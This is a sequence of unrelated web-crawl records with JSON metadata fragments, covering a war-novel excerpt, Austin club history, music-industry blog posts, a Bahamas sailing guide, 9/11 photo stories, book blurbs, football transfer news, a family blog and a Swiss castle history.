world. He no longer had any curiosity as to the end of this war in which he had been so interested. Whatever the end might be, it would be sure to turn out badly. Although the Beast might be mutilated, it would again come forth years afterward, as the eternal curse of mankind. . . . For him the only important thing now was that the war had robbed him of his son. All was gloomy, all was black. The world was going to its ruin. . . . He was going to rest.\nChichi had clambered up on the hillock which contained, perhaps, more than their dead. With furrowed brow, she was contemplating the plain. Graves . . . graves everywhere! The recollection of Julio had already passed to second place in her mind. She could not bring him back, no matter how much she might weep.\nThis vision of the fields of death made her think all the more of the living. As her eyes roved from side to side, she tried, with her hands, to keep down the whirling of her wind-tossed skirts. Rene was standing at the foot of the knoll, and several times after a sweeping glance at the numberless mounds around them, she looked thoughtfully at him, as though trying to establish a relationship between her husband and those below. And he had exposed his life in combats just as these men had done! . . .\n\"And you, my poor darling,\" she continued aloud. \"At this very moment you, too, might be lying here under a heap of earth with a wooden cross at your head, just like these poor unfortunates!\"\nThe sub-lieutenant smiled sadly. Yes, it was so.\n\"Come here; climb up here!\" said Chichi impetuously. \"I want to give you something!\"\nAs soon as he approached her, she flung her arms around his neck, pressed him against the warm softness of her breast, exhaling a perfume of life and love, and kissed him passionately without a thought of her brother, without seeing her aged parents grieving below them and longing to die. . . . And her skirts, freed by the breeze, molded her figure in the superb sweep of the curves of a Grecian vase.", "meta": {"redpajama_set_name": "RedPajamaC4"}, "__index_level_0__": 86542}

{"text": "The East Village building on E. 11th Street, site of the former Charlie's Playhouse club.\nAfter a few years, \"walking in\" to Charlie's Playhouse would become a sore point for some locals. But when business owner Charlie Gilden opened the place in the late 1950s (sometime around 1958), it was a blues club entertaining the predominantly black neighborhood in East Austin.\nCharles Urdy in his home in North Austin. Urdy, a former member of the Austin City Council, used to frequent Charlie's Playhouse.\n\"I think that Charlie's Playhouse came along at a very unique time in Austin's history,\" Urdy said.\nIn 1956, the University of Texas welcomed its first black students. Just four years earlier, the fire station across the street from Charlie's Playhouse became home to Austin's first black firefighters.\nYet despite the appearance of crumbling racial barriers, the nightclub's early years reflected the surrounding neighborhood.\n\"Playing at Charlie's Playhouse, the place was packed \u2013 and it was all black,\" said Henry \"Blues Boy\" Hubbard, speaking with Roger Gatchet in 2008 as part of a University of Texas oral history project. Starting in 1958, Hubbard led the house band at Charlie's \u2013 Blues Boy Hubbard and the Jets.\nBut the patronage soon shifted. Hubbard's band covered popular radio hits of the time, and soon Gilden was fielding calls from UT fraternities to book the band.\nHenry \"Blues Boy\" Hubbard, leader of Charlie's house band the Jets, in the 1950s.\nSoon, the white students started making their way east.\n\"We were kind of into country music at the time,\" said Paula Johnson, who was a student a UT from 1964 to 1969. Johnson would go to Charlie's with her then-boyfriend, the man who would become her first husband.\nSome university students would call ahead to reserve tables at Charlie's. That, said Urdy, was not something that people who lived in the area normally did.\nUrdy said, to those who knew him, Gilden was a businessman first and foremost, though, and he didn't want to alienate his neighbors.\n\"Back in those days, fraternities, in particular, a lot of those kids had a lot of money, and they'd spend every bit of it. Unlike the average working-class person in East Austin who had a limited budget,\" Urdy said.\nHubbard said word got around that the club was catering to white folks.\nKUT's Audrey McGlinchy reports on the long-shuttered East Austin club Charlie's Playhouse.\nTommy Wyatt, editor-in-chief of The Villager newspaper, at his office in East Austin.\nAccording to Urdy, Huston-Tillotson students began picketing outside Charlie's. Tommy Wyatt, publisher of The Villager, remembered it the same way.\nIt's not clear when or how the demonstrations ended, but soon Hubbard said Friday and Saturday nights at Charlie's were almost entirely white.\n\"It would be like 98 percent white,\" he said.\nThe club attracted some high-profile visitors. According to a March 1965 Statesman article titled, \"White House Staffers Regain Missing Coats,\" two of President Lyndon B. Johnson's aides reported that their jackets stolen from Charlie's Playhouse during a White House visit to Central Texas. According to police at the time, the coats were swiped by mistake.\nEventually, Charlie's shut down in the early 1970s. When asked why the place had closed, Hubbard said because of integration.\nAt the same time, Austin Independent School District decided to shutter Anderson High School in East Austin, as students more than a decade earlier had begun to integrate schools throughout the city. Many in the neighborhood said this meant losing an element that bound the community together. So while gains were being made, Urdy said, there was also a lot to lose.\nDonald \"Duck\" Jennings, a former member of the Jets, at the 2015 East Side Kings festival at King Bee in East Austin.\nIn place of Charlie's Playhouse at the corner of East 11th Street now stands a four-story apartment building. Save for the Victory Grill, there's little evidence of the music scene that at one time dominated the area.\n\"It's not an entertainment center for the community like it was when Charlie's Playhouse was there,\" Urdy said.\nMeantime, up on East 12th Street, community leaders are working to assemble a merchants association. The hope is to provide local and longtime business owners with more resources and protections.\nAside from some passing traffic, the northeast corner of 12th and Chicon streets remains fairly quiet in the early morning hours.", "meta": {"redpajama_set_name": "RedPajamaC4"}, "__index_level_0__": 12717}
{"text": "Have you ever looked into a person's eyes and noticed they seemed, well, not all together? Maybe their eyes were shifting from side to side, or maybe they just seemed cloudy and dull, as if they were not really in the present moment. Perhaps they seemed dazed or confused. This is poor shen. Sometimes mild depression or distraction can cause this shen disturbance; if very severe, it can manifest as mental illness, such as schizophrenia.\nOne of my professors once described the heart's job as maintaining appropriate timing in life. He used an example of a person wearing a bathing suit. If this person wore the suit out to the pool in the summer, his heart was doing its job. But if he put the bathing suit on for a business meeting, it meant the heart was not allowing him to make the right choice for the circumstances. In short, the Heart is all about maintaining the correct behavior for specific situations. Think about behavior patterns you might see in the case of mental illness: inappropriate speech or tone of voice, making unsafe decisions, misjudging situations and social cues.\nThe heart is not about moderation; it is an organ of extremes, from wild joy to crushing lows. Extreme joy may seem like a positive thing, but this is the type of joy unsustainable and it burns out quickly. Think of manic-depression: manic highs, followed by deep depression. Both depression and anxiety are linked to the heart. ADHD is also considered to be a result of heart imbalance; the hyperactivity is a result of the heart not properly controlling the mind.\nThis article was posted in Acupuncture, Traditional Chinese Medicine and tagged adhd, anxiety, depression, heart.

A UK artist, who goes by the name of Kieran Hebden (artist alias of Four Tet) has instigated legal action against his record label, Domino Records for 20 years. Many contracts associated with music artists often precede streaming services and \u2013 more importantly, the power role they've come into the 21st Century.\nAccording to Hebden's 2001 contact agreements, Hebden is entitled to an 18% royalty rate from physical sales and a 50% cut from licensing income. However, the music streaming moguls of our Internet bonanza have become ambiguous and less considered to their artists whom they \"provide\" for and as such, has allowed record labels to apply the same 18% rate as their physical counterparts in sales. But, like many, artists simply don't believe that physical sales and streaming are one and the same and should be placed in the licensing income bracket \u2013 worthy of a 50% cut.\nWhile many other artists before Tet have brought forward the case of music moguls tearing the legalities of artistry independence \u2013 the likes of Ye and Taylor Swift to name a few \u2013 it may be the first discussion that brings it forward to a full public hearing, which is a huge development in changing the course of royalty revenue on streaming platforms.\nAs such, after Hebden's litigation, Domino records have responded. The declaration of what he owes transpires to the albums that Domino own the rights to, which is another 50 years or so. With that in mind, the record label have simply removed three of his most popular albums from streaming services altogether thus giving him no royalties in streams .. and no leg to stand on. Their recent move has solidified what we already know about the monopoly of record label in our industry \u2013 callous and greedy.\nBut it has also widened the scope into the survival of the music industry and whether or we not we can simply do without these record labels with their outdated and out of touch legally-binding contracts: which do nothing but bind the artist to the industry devil.\nHopefully, we'll hear more about this as news progresses into the Spring of 2022.\nTags album review, Alternative Rock, Art, artists, Blog, Blogger Thoughts, Commentary, Culture, Entertainment, hard rock, Indie, Indie Music, industry support, Let's Talk, live music, music, music album, music album review, music artist, Music artists, music industry, music insight, music news, Music Playlist, music review, music streaming, new music, Opinion, Pop, Pop Music, Punk, Rock, Rock Music, Rock Playlist, Spotify, thoughts, UK festivals, UK Music, US Music, Vinyl\nAlbum album concept Art artist Best of British Blog Blogger Thoughts Classics COVID Culture Favourites Film hard rock Hip-Hop Indie Let's Talk Life Listening Music live music music UK Music US Music Vinyl Wordpress\nYour Release Radar: First of 2022\nPost date Jan 5, 2022\n2 Comments on Your Release Radar: First of 2022\nWell here we are folks. The first one of 2022, we drop in with a Release Radar. Honing in on those instrumentals missed since the new year. With January usually being a quiet month on all fronts of entertainment, we can certainly expect new album material in the coming months of February and March.\nIn preparation for a monster season, Alt-J release another single since Christmas with, 'Hard Drive Gold.' Funky with that chic of indie-alternative, I'm looking forward to their 2017 follow-up, RELAXER which was received with mixed thoughts.\nGlaswegian hot-rocks of The Snuts equal their debut just as emphatically with single edits of Burn The Empire. A fantastically ferocious piece of music. Love it.\nNoel and his birds return another mark-up forgotten in the Oasis B-sides with, 'Trying to Find a World That's Been and Gone: Part 1'. Bastille reunite for their fourth work, distorted electronica that is far from their straight-edged indie rock debut, 'Bad Blood.' \u2013 But still features their infectious and highly contagious pop anthems that has ramped them up to one of the most prestigious bands in the world. Be sure to catch them on 'Give Me The Future' on the 4th of February.\nWith remixes and mixtapes abound creatively, it seems we're striving for singles to shift the deeper we get into the year.

Not only for maximum efficiency in terms of client reports but maximum accuracy in terms of music licensing the venue to the best of our knowledge. All because we've seen the venue with our own eyes!\nQuite simply, it puts a face, a name and an icon to the black and white data-entry accounts. Above all, it makes it personal, natural and far more enjoyable enjoyable in terms of what we do for music licensing \u2013 which really, is all about for the working musician.\nFor my first field trip as a Live Music New Business Advisor, it was extremely insightful. When we travelled past Knebworth and it's mighty park \u2013 which was put on the map from Oasis's iconic performance in '96 \u2013 before we headed into Central London, I knew I would be in for a treat. If such a staple in musical history is dotted just outside the capital of London, what cultural significance is tucked away in the centre of the capital?\nFirst, we headed down within the shadow of the Shard via Amazing Grace, a newly refurbished church-now-turned bar nightclub, it had all the qualities of a fantastic and elusive venue for underplays and musical vibes perfect for a relaxing Friday evening. After that swell visit and a talk with the owners about everything to do with the music licence, we swiftly headed west to Hammersmith. An often quaint but equally illustrious as the glorious amphitheatre of Apollo greets you in the vast stretch of culture, as you step out of the underground station. At Hammersmith, we had the privilege of attending a tour at one Riverside Studios, a circular space for multi-art performances, theatre shows, cinema screenings and a magnitude of musical events. First popularised for its feature filming of Doctor Who during the first couple of series (and the use of stage doors as the noise for EXTERMINATE) it is now a Jack-of-all-trades swivelling circus of party tricks. If you're around London between Christmas and New Year, I recommend diving in to check out the 360 AllStars variety show they have coming in.\nGrabbing a mocha to go, we headed back to the realms of underground during dreaded rush hour. Fortunately, with working from home a viable option for many commuters, it didn't necessarily seem that bad for a Friday.\nNow here I am, lodging notes in my phone as the train heads back to familiar territory. My familiar territory.\nIt would be an advantageous decision to do more field visits in the future. Covering the scope of the UK, live music new business is ripe for the taking. Especially after the horrors of a pandemic, the opportunity for growth in live music and the entertainment sector is colossal. With ample drip-feedings being delivered from the Government, establishing the premise of music licensing via a friendly face is all-the-more-important for maximum efficiency and accuracy in today's current industry.\nMore to come I hope. As always, thanks London.\nTags album review, Alternative Rock, Art, Blog, Blogger Thoughts, Culture, Entertainment, Let's Talk, live music, London, music, music album, music album review, music artist, Music artists, music industry, music insight, music news, Music Playlist, music review, music scene, music streaming, new music, Opinion, Rock, Rock Music, thoughts, UK festivals, UK Music\nAlbum album concept album review Alternative Rock Art artist Blog Commentary Culture Entertainment Film hard rock Indie Life Listening Music live music music music artist music news music nostalgia Music Playlist news Opinion Review Rock Rock Playlist thoughts UK Music\nSong of the Day: Pacific Avenue's Something Good\n6 Comments on Song of the Day: Pacific Avenue's Something Good\nDrawn from their 2019 debut EP, Strawberry Skies, it emphasises our love of summer, traditional holidays in the sun, and taking life one relaxing day at a time.\nThe Australian 4-piece brings fantastic contemporary indie flavours and blends of timeless rock that stays fresh in the sunlight. \"Something Good\" is the epitome of their work so far, as it demonstrates their knack of rock calling and have become one of the best emerging talents in the Aussie country.\nPlenty to bring too, with their recent flurry of excitement, Easy Love \u2013 which is another timeless indie summer classic.\nYou could very well argue how oversaturated we are already with summer indie tunes.

What could be better?\nThe Abacos are a group of islands and islets which stretch out over around 210 km of turquoise sea\u2026 The first colonizers came from New England in 1783, and thanks to fishing, quickly prospered. Today, the calm, naturally protected waters of the Abacos are the main attraction. You will most probably arrive through Marsh Harbour, which has not only an airport, but also the islands' only \"traffic lights\". This is the departure point for the charter companies in the Bahamas. It is worth noting that the area is protected by one of the largest coral reefs in the world, which will only contribute to your unforgettable vacation. Whether you are looking for secluded anchorages or American-standard marinas to stock up on supplies, everything is possible in this zone which covers more than 200 islands! Wander up the steps of the red and white striped Hope Town lighthouse, still manually operated and powered by kerosene. The brightly-colored houses of Green Turtle Cay have an air of belonging to another century. And at Man-O-War Cay, the boat builders still stick to the techniques passed down by their ancestors. Next, head for Treasure Cay, one of the most beautiful beaches in the Bahamas. Keen divers can explore a veritable underwater garden in the Pelican Cay National Park\u2026 The name Bahamas comes from the Spanish \"Baja Mar\" which means shallow waters\u2026 If the Spanish didn't find much to interest them in the Bahamas, they soon became the bolt hole for privateers and pirates such as Black Beard. You're free to go looking for his treasure (or that of his fellow pirates) which is surely buried on some deserted island\u2026\nIf you head off the beaten track you will discover some fabulous locations that just you and your crew will share.\nThe Bahamas: Practical Info\nFormalities: Current, valid passport (valid for six months beyond return date), and a return ticket or a ticket for another destination. The Bahamas are very accessible. From the States (via Florida) with connections to most of the major islands. From Europe, there are direct flights to Nassau or Miami. Be aware that if you are transiting through the USA and your country benefits from a visa exemption, you will still need to request via internet an electronic travel authorization, known as an ETSA.\nWeather: Hurricane season: June through November. Usually there is little risk during June and July. Tourist Season: All year round. Summer is hotter and more humid. In winter the sea can get a little fresh\u2026\nTemperatures: With the Gulf Stream on the west and the Trade Winds to the South East, the conditions are very pleasant. On average, air temperatures range between 25 and 32\u00b0C and water temperatures are between 24\u00b0C and 30\u00b0C.\nSailing Conditions The Winds: From December through February, the prevailing winds blow from the north east at around 15-20 knots. From June, they come from the south east and blow at 10-15 knots. Navigational Buoys: IALA Region \"B\": (red right returning)\nCurrency: The Bahamian dollar has the same exchange rate as the US dollar. Both currencies are used and accepted and credit cards are widely accepted.\nCharter companies present: Dream Yacht Charter, Florida Yacht Charter, Maine Cat Charter, Oceans Evasion, Sunsail, The Moorings\u2026\nClear waters and white sandy beaches: The Bahamas offer idyllic cruising!\nTypical Itinerary\nThere is no shortage of anchorages\u2026 Here's a standard itinerary suggested by The Moorings, leaving from Marsh Harbour.\nMarsh Harbour to Man-O-War Cay.\n4 miles to get you into the swing of things\u2026 You'll hardly be out of the harbor, and you'll discover your first reefs and a community of around 200 souls. For many years, Man-O-War Cay was an important naval construction base. A wonderful first anchorage.\nOnly 8 miles separate Great Guana Cay from Man-O-war Cay. You should set off early to allow time to visit Fowl Cay Marine Park. Here you can get your masks and snorkels on and take advantage of the great diversity of the Bahamian waters. Carry on to Baker's Bay, a creek lined with trees at the northern point of Great Guana Cay. To the west of your anchorage, admire the exceptional panorama with the sun setting over the Abaco Sea. This anchorage is lined with restaurants\nGreen Turtle Cay\nGreat Guana Cay to Green Turtle Cay: 12 Miles. We make the most of this short sail to head out into the Atlantic, leaving Whale Cay to starboard, before coming back into more sheltered waters to the west as we avoid the sand banks, before turning northwest and heading to the anchorage of green Turtle Cay. After the relative seclusion of the first two nights, you can choose whether you would like to spend the night in a marina, or to drop anchor in New Plymouth, where you can visit the museum, its sculpture-filled gardens, and try out the restaurants.\nTreasure Cay\nGreen Turtle Cay to Treasure Cay: 24 miles. Get going early in the morning and head north, taking time out to swim or go diving, or simply to just explore the beaches and the walking tracks of Manjack Cay, after about 5 miles. This is a really charming spot. The easiest anchorage to access is between Manjack Bluff and Crab Cay. Then head south towards Treasure Cay, well known for its tourism infrastructure, and its white sandy beach, famed the world over thanks to its crescent shape which stretches for nearly 5km.\nToday, an 18 mile sail awaits you. Head south east towards Point Set Rock, with a fair wind and you'll have no problems. When you get to the rocks, you leave Man-O-War Cay to port and you will come upon Elbow Cay, home to Hope Town and its famous lighthouse. A visit to the well stocked, pedestrianized town is a must, as is a dive with flippers, mask and snorkel on the reef on the Atlantic side at Elbow Cay.\nThe famous Hope Town lighthouse is worth a visit\u2026\nA 20 mile sail will offer you the chance to stop at Pelican Cays Land and Sea Park where you can take a memorable dive. There are more than 150 species of birds, sea creatures and plants living here. Further south on Great Abaco, you will find the Little Harbour anchorage, where you can visit the Johnston Studios and Art Foundry. Relax on board while watching the turtles and the porpoises which swim alongside your boat, then take your dinghy and go for dinner at Pete's Pub, an open air bar with an art gallery.\nElbow Cay\nFor your last full day of sailing, head north for 15 miles, discovering Lubbers Quarters Cay, Tahiti Beach (with its giant starfish) and White Sound. The next morning, there's just a 10 mile sail to take on before handing back your boat\u2026\nBlue water cruising\nCharter a catamaran for this destination\nOCEANS EVASION\nSUNSAIL\nDREAM YACHT CHARTER\nSee all the destinations\nThe Bahamas, a dream destination for a multihull\nThe Unmissable Grenadines\u2026\nAsk for a quote online for your next cruises with\nThe Moorings --\nThe prettiest postcards\nShare your postcards with us and get One year's digital subscritpion free!\nBecome a Multihulls World Community Member\nget exclusive benefits", "meta": {"redpajama_set_name": "RedPajamaCommonCrawl"}, "__index_level_0__": 51748}

Many people who were trapped in the towers threw themselves out of windows as they realised they wouldn't be able to make it out in time.\nIt was published in hundreds of newspapers, but some criticised it for being exploitative.\nThe person in the photograph has never been identified, but it's thought he worked at the Windows of he World restaurant in the North Tower.\nRichard told The Daily Beast of the shot: \"For me, it's a very quiet moment.\n\"It's not a violent picture in any way.\n\"I think some people are turned off by this picture because it could be their fate.\n\"But it's not a part of this man's death, it's a part of his life.\"\nEdward Fine, the dust man\nEdward was about to get one of the lifts in the North Tower when the plane hit.\nHe thought a bomb had gone off, and was one of many who started rushing down the stairs to get out \u2013 he was on floor 79.\nHe made it out just as the second plane struck the South Tower, and this photo of him was taken by Stan Honda.\nThe shock on his face is obvious, with Edward later revealing there was just one thing on his mind when it was taken.\n\"I was focused in on: I must get uptown, I must keep surviving, I must walk,\" he said on The Today Show.\n\"And I wasn't looking or thinking about anything other than surviving.\"\nFive years ago, Edward told The Mirror he felt he was saved for a reason. At the time he was a consultant for a company which created single-use syringes.\n\"My story is a very positive story,\" he said.\n\"Once I got out I was never depressed. I think about how lucky I was. But I feel terrible for those who did not survive.\"\nMarcy Borders, the dust lady\nMarcy was 28 and on the 81st floor of the North Tower when the plane crashed into it. She had just started a new job.\nLike Edward her photo was taken by Stan Honda.\nMarcy passed away last year at the age of 42, following a battle with stomach cancer.\nShe suffered with depression following the terrorist attack, and following her cancer diagnosis told The Jersey Journal she thought her illness might be linked to what happened.\n\"I'm saying to myself, 'Did this thing ignite cancer cells in me?'\" she said.\n\"I definitely believe it because I haven't had any illnesses. I don't have high blood pressure\u2026 high cholesterol, diabetes. How do you go from being healthy to waking up the next day with cancer.\"\nTIME magazine cover\nThis was taken by photographer Lyle Owerko, who had jetlag and was struggling to sleep when he heard the thundering noise of the first plane hitting the Twin Towers in 2001.\nHe went to see what was happening, taking his camera with him.\nAs he realised what had happened he began taking photos, and he was actually aiming his camera at people when he heard the noise of the next plane approaching.\nHe took the iconic photo just as the impact happened.\n\"When it hit I had no idea, but I thought something would occur,\" he recalled.\n\"And when it hit, again it made this incredible beyond movie theatre sound.\n\"And then nothing happened for a second until this fireball of heat and debris erupted out of the backside of the building and that's when I caught the cover shot.\"\nHistory is made on 'Big Brother' as all-Black final six ensures show's first-ever Black winner\nHospitals sent thousands of elderly patients back to care homes despite testing positive for Covid\nMy boss told me 'don't be a baby' when I told him I couldn't work on the weekends \u2013 now I've won \u00a340,000\n'Obsessively jealous' woman stabbed boyfriend to death with a barbecue skewer after accusing him of cheating during picnic with pals\nPakistan says it has shot down two Indian fighter jets\nPrevious Previous post: Serena Williams OUT of US Open as ex-world No1 is beaten by Victoria Azarenka after suffering Achilles injury\nNext Next post: Chelsea 'reject stunning N'Golo Kante for Christian Eriksen and Marcelo Brozovic swap transfer offer by Inter Milan'\nTop Gear is SUSPENDED after Freddie Flintoff's horror car crash", "meta": {"redpajama_set_name": "RedPajamaCommonCrawl"}, "__index_level_0__": 86091}

His mother was the subject of gossip even before she eloped with a vampire, giving rise to the rumors that Remy is half-vampire himself. Though the kingdom of Aluria barely tolerates him, Remy's father has been shaping him into a weapon to fight for the kingdom at any cost.\nWhen a terrifying new breed of vampire is sighted outside of the city, Remy prepares to investigate alone. But then he encounters the shockingly warmhearted vampire heiress Xiaodan Song and her infuriatingly arrogant fianc\u00e9, vampire lord Zidan Malekh, who may hold the key to defeating the creatures\u2014though he knows associating with them won't do his reputation any favors. When he's offered a spot alongside them to find the truth about the mutating virus Rot that's plaguing the kingdom, Remy faces a choice.\nIt's one he's certain he'll regret.\nBut as the three face dangerous hardships during their journey, Remy develops fond and complicated feelings for the couple. He begins to question what he holds true about vampires, as well as the story behind his own family legacy. As the Rot continues to spread across the kingdom, Remy must decide where his loyalties lie: with his father and the kingdom he's been trained all his life to defend or the vampires who might just be the death of him.\nMasked by Moonlight by L.G.

Edgar Allan Poe died on October 7, 1849, at just forty, in a painful, utterly bizarre manner that would not have been out of place in one of his own tales of terror. What was the cause of his untimely death, and what happened to him during the three missing days before he was found, delirious and \"in great distress\" on the streets of Baltimore, wearing ill-fitting clothes that were not his own?\nMystery and horror. Poe, who remains one of the most iconic of American writers, died under haunting circumstances that reflect the two literary genres he took to new heights. Over the years, there has been a staggering amount of speculation about the cause of death, from rabies and syphilis to suicide, alcoholism, and even murder. But many of these theories are formed on the basis of the caricature we have come to associate with Poe: the gloomy-eyed grandfather of Goth, hunched over a writing desk with a raven perched on one shoulder, drunkenly scribbling his chilling masterpieces. By debunking the myths of how he lived, we come closer to understanding the real Poe\u2014and uncovering the truth behind his mysterious death, as a new theory emerges that could prove the cause of Poe's death was haunting him all his life.\nIn a compelling dual-timeline narrative alternating between Poe's increasingly desperate last months and his brief but impactful life, Mark Dawidziak sheds new light on the enigmatic master of macabre.\nBirthright by Kathryn Amurra | Soothsayer's Path Book #3 | Historical Romance | Add to Goodreads\nThe daughter of a patrician woman who chose to marry beneath her class, Nerilla has witnessed firsthand the detrimental effects of following your heart. Determined to correct her mother's mistakes, she has carefully selected the perfect patrician man to wed. The fact that the man is only marrying her to obtain her father's legendary sword Ceres, which is to serve as her dowry, is of no consequence\u2013that is, until that very sword is stolen right out from under her nose by a handsome thief with a charming smile and innocent eyes.\nAs an orphan with no memory of his birth parents, Jovian has been searching for the truth about his parentage for as long as he can remember. When a soothsayer tells him that to uncover the key to his past he must seek out the sword called Ceres, he can hardly believe his luck, for he has already stolen that sword from its owner. Unfortunately, he has also already sold it to a man bound for Neapolis.\nA chance meeting between Nerilla and Jovian results in what they both know is an ill-advised arrangement. As they work together to find the sword, they discover secrets from their pasts that make them question everything they thought they knew. And they find themselves having to choose between pursuing the perfect plans they've laid or risking failure for the chance of achieving their true birthright.\nSaint's Blood by Sebastien de Castell | Greatcoats #3 | Fantasy | Add to Goodreads\nHow do you kill a Saint?\nFalcio, Kest, and Brasti are about to find out, because someone has figured out a way to do it and they've started with a friend.\nThe Dukes were already looking for ways out of their agreement to put Aline on the throne, but with the Saints turning up dead, rumours are spreading that the Gods themselves oppose her ascension. Now churches are looking to protect themselves by bringing back the military orders of religious soldiers, assassins, and (especially) Inquisitors \u2013 a move that could turn the country into a theocracy. The only way Falcio can put a stop to it is by finding the murderer. He has only one clue: a terrifying iron mask which makes the Saints vulnerable by driving them mad. But even if he can find the killer, he'll still have to face him in battle.\nAnd that may be a duel that no swordsman, no matter how skilled, can hope to win.\nA Mystery of Mysteries: The Death and Life of Edgar Allan Poe Birthright Blogging Book Blog Book Blogging Books Currently Reading Hiro Fujiwara It's Monday Kathryn Amurra L.G.

{"text": "For under \u00a32m, Celtic can bag gold by signing this 21-year-old Lustig replacement before deadline day\nby Mizgan Masani January 22, 2019, 3:00 am\nWhy Celtic should sign Fernando Fonseca from Porto\nAccording to a report in Scottish Sun, Premiership leaders Celtic are eager to bring a long-term solution for the right-back slot, and they are targeting Porto's Fernando Fonseca.\nHoops manager Brendan Rodgers is desperate to sign Mikael Lustig's replacement this month, with an eye to get the 21-year-old over the line at Parkhead. The club has been scouting a few players for that position in Europe, and have Fonseca on their radar (h/t Scottish Sun).\nThe Portuguese was close to joining Italian giants Juventus for \u00a32m in the summer, but has fallen out of the picture. As per the report, Porto would be open to doing business with Celtic. The player has 18 months left on his contract and he would be available for under \u00a32m.\nFonseca was on loan at Estoril last season and has only made three appearances for Porto B this year. For receiving regular first-team football, he would be open to making a move to Scotland (h/t Scottish Sun).\nFernando Fonseca\nHere's why Celtic should sign the 21-year-old during this month's transfer window:\nFonseca's potential is positive for the Hoops\nAs mentioned above, Celtic have been aiming to get Mikael Lustig's long-term replacement by the end of this month. The Sweden international hasn't been at his best in the last year or so, making the right-back position vulnerable. Opposition teams have tended to attack on that side, exposing the team's weak area.\nHence, it is pretty evident as to why the Hoops are looking for a new right-back. They have scouted quite a few full-backs, but Fernando Fonseca could be the right choice.\nThe 21-year-old has a great potential to become one of the better full-backs in the circuit. He hasn't recieved many opportunities at Porto, and might be eager to prove himself if given a chance.\nThe Portuguese youngster possesses great pace to make runs up and down that right flank. He is pretty good at making recovery runs as well, which is one of the important aspects of being a successful full-back. Furthermore, the one on one defending and physicality is there to not allow easy balls into the box from his side.\nThe only thing that Fonseca lacks as of now is the quality of the final ball. He gets into good positions but sometimes picks the wrong pass. That can be worked upon and improved in due course of time. The good thing about him is that the defensive part of his game looks solid, which is the necessity.\nRead More: Celtic signing this experienced Aston Villa star would be a huge boost to their title aspirations\nHence, at such a low price, Celtic could get a gem of a player, with whom Rodgers could work wonders.\nWritten by Mizgan Masani\nA football enthusiast, who loves to analyse the game in depth.

{"text": "A little late but I wanted to put up these fun pics from Thanksgiving.\nSo thankful for all of our little monkeys!\nLuca continues with his swim classes. He's doing well learning his different floats and swim strokes. Kitty and I were surprised this past week when Luca was swimming across the pool and came up just short of the wall. He went underwater, popped back up, and treaded water for around 20 seconds. It was pretty cool.\nAfter swim class shower. His hair is so curly!\nWe went to Kitty's grandmas house for Thanksgiving. It was one of the longer car trips for Autumn. She's not what I'd call a fan of car trips. We stopped 3 times and the 1 .5 hour trip took 3. We still love you baby girl.\nLuca is always gentle with his baby sister\u2026.\nAlthough to be perfectly honest I believe right after this picture was snapped Autumn sort of peeled off to her left and ended up face down the corner of the couch. Luca did voice his concern though.\nMany have heard the sad news that my Grandma June passed away last week. I was happy to be there with her for her final days and so very glad that she is at peace and with all of our loved ones who have already passed away.\nI grew up with my Grandma June in Corvallis. She was there for every Thanksgiving, Christmas, performance, and graduation. She loved her Elvis, her boys, and her family. She was always supportive and never missed a chance to comment on her affinity for my dark hair and light eyes.\nFrom a young age my mom and I would load up our lawn mower every weekend, drive across town, and I'd mow my grandma's lawn. As I got older I'd eventually begin to drive myself, but every weekend I made it over there to mow her lawn. Afterwards she always had a small bag of lays potato chips, a soda, and some Werther's candy. I used to think I was doing her a favor driving across town and battling the garden snakes, but as I got older and looked back I realized that those moments were priceless and I got so much more than just chips and candy. From her advice to always pay off my credit cards to her talks about moderation and being a good boy, I learned so much from my grandma.\nOne of the things I am most happy about is the fact my Grandma June was able to meet and play with Luca several times since we moved back to Oregon. Most recently she was so excited to hear Luca was in town she jumped up, left her dinner, and rushed over to my mom's house. She was always so happy to hear about what Luca was doing and loved squeezing his little fat toes. Luca loved his great grandma as well, always putting on a show when she was around. We will miss you Grandma June. Love you. Rest in Peace.", "meta": {"redpajama_set_name": "RedPajamaC4"}, "__index_level_0__": 13631}

{"text": "The Altes Schloss B\u00fcmpliz () is a castle in the section of B\u00fcmpliz-Oberbottigen in the city of Bern of the canton of Bern in Switzerland.\n\nHistory\nThe first structure on the site was a Burgundian royal estate which was built around 900.  The estate is first mentioned by the Burgundian King Rudolf III around 1010, but he lists his father as the builder of the estate.  Very little is known about this first castle, except that it consisted of a circular wooden wall with several wooden buildings inside the wall.  Around 1260 or between 1250 and 1270 a round stone tower was built in the center of the site.  This round tower was quite unusual for Bernese castles but may indicate a savoyard influence.  Since Peter II of Savoy held authority over Bern at the time, it is likely, but not confirmed, that the round tower was built as a symbol of Savoy's power.  The tower had an outer diameter of  and a thickness of about .  It probably rose about  high.  The round tower no longer exists, but its location is marked with a cross on the floor of the current restaurant terrace.  Shortly after the construction of the tower, the wooden wall was replaced with a stone wall and a half-round tower was added to protect the wall.  The round central tower was demolished in the following decades.  The growing Bernese power began to force Savoy out of B\u00fcmpliz and by the late 13th century, there were Bernese nobles who were naming themselves after their estates in B\u00fcmpliz.  Under the Bernese nobles, the castle remained unchanged until 1470.\n\nIn 1470 B\u00fcmpliz village and the castle became part of the lands of the powerful Bernese patrician Erlach family.  The castle was rebuilt from a purely defensive structure into an impressive administrative and residential castle.  A new gatehouse tower was built, and stands, almost unchanged, today.  The gatehouse tower was square and about  on each side.  It is  high to the eaves, with an additional  to the peak of the roof.  The supports and structure of the drawbridge over the moat are still visible today.  The gatehouse faces west.  Next to the gatehouse, the south-west wall was raised and a block of rooms were added on the inside.  Between the gatehouse and the south-west wing, a half-round tower, the Abortturm was built.  The Abortturm, which no longer exists, contained bathrooms for the first and second floors as well as stairs into the roof over the gatehouse.  Around the same time, the old half-round tower in the north-east and the eastern housing tract were expanded.  The north-west housing tract, which flanks the gatehouse, was built later, around 1630.\n\nIn the following century, the Old Castle became increasingly old fashioned and uncomfortable.  In 1742, Daniel Tschiffely hired Albrecht St\u00fcrler to replace the old building with the Neues Schloss B\u00fcmpliz.  The New Castle was built surrounded by parks and gardens southwest of the Old Castle.  During construction, much of the Old Castle was pulled down or rebuilt.  The old half-round tower, the south-west and south-east housing tracts and the Abortturm were all demolished.  The moat was drained and filled in.  The gate in the gatehouse tower was bricked up and the road was rerouted around the tower.  Portions of the north-west wing remained.  The north-east wing was rebuilt into a barn and the courtyard was converted into a vegetable garden and chicken coops.\n\nIn 1839 Johann Friedrich Albrecht Tribolet bought the Old and New Castles from Carl von Tavel.  He rebuilt the buildings and used them as a private sanatorium for mental patients.  Tribolet would later become the director of the psychiatric Klinik Waldau.  Between 1839 and 1849 the calm patients were housed in the New Castle, while the violent or noisy lived in the Old.  In 1849 the buildings were acquired by Jakob Allemann who 